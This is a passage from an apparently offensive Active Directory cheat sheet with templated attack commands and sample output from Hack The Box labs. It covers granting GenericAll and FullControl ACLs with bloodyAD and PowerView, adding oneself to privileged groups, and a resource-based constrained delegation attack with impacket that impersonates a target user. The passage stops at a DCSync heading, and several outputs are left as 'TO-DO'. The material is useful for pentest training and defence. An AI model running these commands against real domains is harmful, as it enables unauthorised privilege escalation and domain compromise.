</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberos
</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --host <span class="o editable-keyword">&lt;DC&gt;</span> add genericAll 'OU=<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>,DC=<span class="o editable-keyword">&lt;EXAMPLE&gt;</span>,DC=<span class="o editable-keyword">&lt;COM&gt;</span>' '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> bloodyAD -d absolute.htb -u <span class="s1">'m.lovegod'</span> -p <span class="s1">'AbsoluteLDAP2022!'</span> -k --host dc.absolute.htb add genericAll <span class="s1">'NETWORK AUDIT'</span> <span class="s1">'m.lovegod'</span> 
</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod has now GenericAll on NETWORK AUDIT
</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div><div class="tabcontent" data-tabset="set4" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; powerview '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>@<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> powerview <span class="s1">'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'</span>
</span></span><span class="line"><span class="cl"><span class="go">Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:11:06] Channel binding is enforced!
</span></span></span><span class="line"><span class="cl"><span class="go">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
</span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; 
</span></span></span></div></pre></div><h4 id="2-add-self-to-group">2. Add Self to Group</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>' -Members '<span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
</span></span></span></div></pre></div><h4 id="3-check">3. Check</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainGroupMember -Identity 'servicemgmt'
</span></span></span><span class="line"><span class="cl"><span class="go">GroupDomainName             : ServiceMgmt
</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain                : rebound.htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberName                  : ppaul
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GroupDomainName             : ServiceMgmt
</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain                : rebound.htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberName                  : oorend
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
</span></span></span></div></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add Fullcontrol over Target Group</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login to apply changes
</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity '<span class="o editable-keyword">&lt;TARGET_GROUP&gt;</span>' -PrincipalIdentity '<span class="o editable-keyword">&lt;USER&gt;</span>' -Rights fullcontrol
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] DACL modified successfully!
</span></span></span></div></pre></div><h4 id="5-check">5. Check</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity '<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' -Where 'SecurityIdentifier contains <span class="o editable-keyword">&lt;USER&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
</span></span></span><span class="line"><span class="cl"><span class="go">ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
</span></span></span><span class="line"><span class="cl"><span class="go">ACEType                     : ACCESS_ALLOWED_ACE
</span></span></span><span class="line"><span class="cl"><span class="go">ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
</span></span></span><span class="line"><span class="cl"><span class="go">ActiveDirectoryRights       : FullControl
</span></span></span><span class="line"><span class="cl"><span class="go">AccessMask                  : 0xf01ff
</span></span></span><span class="line"><span class="cl"><span class="go">InheritanceType             : None
</span></span></span><span class="line"><span class="cl"><span class="go">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></div>

<p></p>
<h3 id="abuse-4--add-self-to-group-from-windows">Abuse #4 : Add Self to Group (From Windows)</h3>
<p class="tabs">
<button data-tabset="set5" data-tabcontent="tab1" class="active">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set5"><div class="tabcontent active" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
</span></span></span></div></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a Cred Object (runas) [Optional]</h4>
<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">'<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\<span class="o editable-keyword">&lt;USER&gt;</span>'</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'</span> -AsPlainText -Force
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
</span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-add-self-to-group">3. Add Self to Group</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>' -Members '<span class="o editable-keyword">&lt;USER&gt;</span>' -Credential $Cred
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
</span></span></span><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
</span></span></span></div></pre></div><h4 id="4-check">4. Check</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity '<span class="o editable-keyword">&lt;GROUP&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; Get-DomainGroupMember -Identity 'security engineers'
</span></span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity 'security engineers'
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">---[SNIP]---
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GroupDomain             : corp.local
</span></span></span><span class="line"><span class="cl"><span class="go">GroupName               : Security Engineers
</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain            : corp.local
</span></span></span><span class="line"><span class="cl"><span class="go">MemberName              : user
</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
</span></span></span><span class="line"><span class="cl"><span class="go">MemberObjectClass       : user
</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
</span></span></span></div></pre></div></div></div><p></p>
<hr>
<h3 id="abuse-5--rbcd-attack-genericwrite-over-dc">Abuse #5 : RBCD Attack (GenericWrite over DC)</h3>
<p class="tabs">
<button data-tabset="set6" data-tabcontent="tab1" class="active">Linux</button>

</p><div class="tabset-wrapper" data-tabset-group="set6"><div class="tabcontent active" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-rbcd -delegate-to '<span class="o editable-keyword">&lt;TARGET_COMPUTER&gt;</span>$' -delegate-from '<span class="o editable-keyword">&lt;USER&gt;</span>' -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -action 'write' '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="2-impersonate">2. Impersonate</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-getST -spn cifs/<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span> -impersonate <span class="o editable-keyword">&lt;TARGET_USER&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="3-import-ticket">3. Import Ticket</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME='<span class="o editable-keyword">&lt;USER&gt;</span>@cifs_<span class="o editable-keyword">&lt;TARGET_DOMAIN&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>.ccache'
</span></span></span></code><div class="output-bubble">Sample Output:
TO-DO</div></pre></div><h4 id="4-dcsync-attack">4. DCSync Attack</h4>
